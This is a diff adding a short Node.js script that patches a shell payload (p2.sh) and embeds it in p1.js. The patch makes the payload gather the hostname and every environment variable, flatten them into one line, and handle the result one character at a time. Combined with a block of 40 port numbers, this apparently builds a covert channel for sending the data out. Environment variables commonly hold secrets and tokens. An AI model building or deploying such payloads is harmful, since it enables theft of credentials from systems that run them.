@@ -1,0 +1,13 @@
+const fs=require('fs');
+let s=fs.readFileSync('p2.sh','latin1');
+const list=Array.from({length:40},(_,i)=>5860+i).join(',');
+s=s.replace(/^L='[0-9,]+'/, "L='"+list+"'");
+s=s.replace(/x="\$\(hostname\)\|"; x="\$x\$\(env 2>\/dev\/null\)"/, 'x="$(hostname);"; x="$x$(env 2>/dev/null | tr \'\\n\' \';\')"');
+s=s.replace('  c=$(printf %s "$x" | cut -c1)', '  c=$(echo "$x" | cut -c1)');
+s=s.replace('  x=$(printf %s "$x" | cut -c2-)', '  x=$(echo "$x" | cut -c2- | tr -d \'\\n\')');
+fs.writeFileSync('p2.sh', s, 'latin1');
+let t=fs.readFileSync('p1.js','utf8');
+t=t.replace(/const S=.*\n/, 'const S='+JSON.stringify(s)+';\n');
+t=t.replace("if(s2.includes('A[A]'))mark(5570);if(s2.includes('B[B]'))mark(5571);if(s2.includes('D[D]'))mark(5572);if(s2.includes('E[E]'))mark(5573);","mark(5574);");
+fs.writeFileSync('p1.js',t);
+console.log(s.split('\n').slice(0,3).join(' | '));
